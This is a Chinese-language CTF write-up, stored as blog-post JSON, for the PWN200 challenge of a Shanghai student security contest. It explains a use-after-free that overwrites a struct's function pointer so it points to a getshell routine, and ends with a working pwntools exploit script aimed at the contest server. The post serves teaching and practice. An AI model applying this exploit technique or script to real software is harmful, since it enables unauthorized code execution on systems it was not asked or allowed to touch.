{"title":"第三届上海市大学生网络安全大赛 PWN200 WriteUp","slug":"第三届上海市大学生网络安全大赛 PWN200 WriteUp","date":"2017-11-08T02:51:50.000Z","updated":"2019-09-12T06:22:21.000Z","comments":true,"path":"api/articles/第三届上海市大学生网络安全大赛 PWN200 WriteUp.json","photos":[],"link":"","excerpt":null,"covers":["http://47.94.96.83/wp-content/uploads/2017/11/70KGOWE9BRMR3NCMRQSG7B.png","http://47.94.96.83/wp-content/uploads/2017/11/LOLT7NK85_5_KISCH4FF.png","http://47.94.96.83/wp-content/uploads/2017/11/T46TG1X4@313JZII8.png","http://47.94.96.83/wp-content/uploads/2017/11/9QPJ932SI19798QE919.png"],"content":"<p> <a href=\"http://creativecommons.org/licenses/by-sa/4.0/\" target=\"_blank\" rel=\"noopener\"> </a> 版权声明：本文为博主原创文章，遵循<a href=\"http://creativecommons.org/licenses/by-sa/4.0/\" target=\"_blank\" rel=\"noopener\"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。  本文链接：<a href=\"https://blog.csdn.net/s1054436218/article/details/78476125\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/s1054436218/article/details/78476125</a>   </p>\n<p>   这题利用了UAF漏洞，在pwnable.kr中有类似的题。简单介绍 一下什么事UAF，UAF就是use after free，就是在C++申请内存的机制中，如果上一次free掉的内存和新申请的内存大小相同，那么再次申请就会申请到刚才free掉的内存，于是例如本题中，结构体嵌套了函数，在再次申请到内存的时候，被覆盖掉原有的内存地址中，把shell的地址放到结构体调用的函数中，就会触发UAF漏洞，详情请看本题。将二进制文件拖进IDA中，反编译后可以看到通过new申请内存的v3、和v5，两个变量应该都是struct，如图所示：<img src=\"http://47.94.96.83/wp-content/uploads/2017/11/70KGOWE9BRMR3NCMRQSG7B.png\" alt></p>\n<p> 转结构体后可以看到明刚开始给V3.char0变量赋值为off_602D78，在内存中，此地址为：<img src=\"http://47.94.96.83/wp-content/uploads/2017/11/LOLT7NK85_5_KISCH4FF.png\" alt></p>\n<p> 其中sub_401450即为getshell的地址，sub401840为一个输出函数，即正常按1会触发的函数，这个地方调用函数的时候是从结构体内存中申请的，所以这里就是我们触发UAF的触发点。接下来我们看after的话会发生什么：<img src=\"http://47.94.96.83/wp-content/uploads/2017/11/T46TG1X4@313JZII8.png\" alt><img src=\"http://47.94.96.83/wp-content/uploads/2017/11/O6PR1YQC967WLM4L5.png\" alt></p>\n<p> 大量没什么用的指令我就不展示了，关键是这两个地方，首先就是它提示你输入一个长度，代表你要申请内存地址的长度，这里要注意下我们要申请的长度不是30，而是0x30，也就是48。在free掉0x30长度的内存空间后，我们申请0x30的内存空间，就会覆盖掉原本结构体的内存地址，当我们再次调用打印信息的函数时，我们把该地址篡改为shell的地址，那么我们就可以getshell了。这里展示一下调用打印信息函数的反编译代码：</p>\n<p> <img src=\"http://47.94.96.83/wp-content/uploads/2017/11/9QPJ932SI19798QE919.png\" alt></p>\n<p> cha0是v3结构体起始的地址，而+8意味着之前初始化赋值的off_602D78+8，在覆盖掉以后，我们需要把调用时的地址篡改为off_602D78，也就是赋值，把结构体覆盖为off_602D78-8。思路很清晰了，下面是我的exp：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">p  = remote(&apos;106.75.8.58&apos;,&apos;12333&apos;)</span><br><span class=\"line\">p.recvuntil(&apos;1. use, 2. after, 3. free&apos;)</span><br><span class=\"line\">p.sendline(&apos;3&apos;)</span><br><span class=\"line\">p.recvuntil(&apos;1. use, 2. after, 3. free&apos;)</span><br><span class=\"line\">p.sendline(&apos;2&apos;)</span><br><span class=\"line\">p.recvuntil(&apos;Please input the length:&apos;)</span><br><span class=\"line\">p.sendline(&apos;48&apos;)</span><br><span class=\"line\">payload = p64(0x0000000000602D70)</span><br><span class=\"line\">time.sleep(1)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(&apos;1. use, 2. after, 3. free&apos;)</span><br><span class=\"line\">p.sendline(&apos;2&apos;)</span><br><span class=\"line\">p.recvuntil(&apos;Please input the length:&apos;)</span><br><span class=\"line\">p.sendline(&apos;48&apos;)</span><br><span class=\"line\">time.sleep(1)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(&apos;1. use, 2. after, 3. free&apos;)</span><br><span class=\"line\">time.sleep(1)</span><br><span class=\"line\">p.sendline(&apos;1&apos;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p> 更多参考资料：1、<a href=\"http://blog.csdn.net/qq_29343201/article/details/51337025\" target=\"_blank\" rel=\"noopener\">Pwntools使用</a>2、<a href=\"http://bobao.360.cn/news/detail/3429.html\" target=\"_blank\" rel=\"noopener\">UAF漏洞介绍</a>   </p>\n","categories":[],"tags":[{"name":"CSDN迁移","slug":"CSDN迁移","count":25,"path":"api/tags/CSDN迁移.json"}]}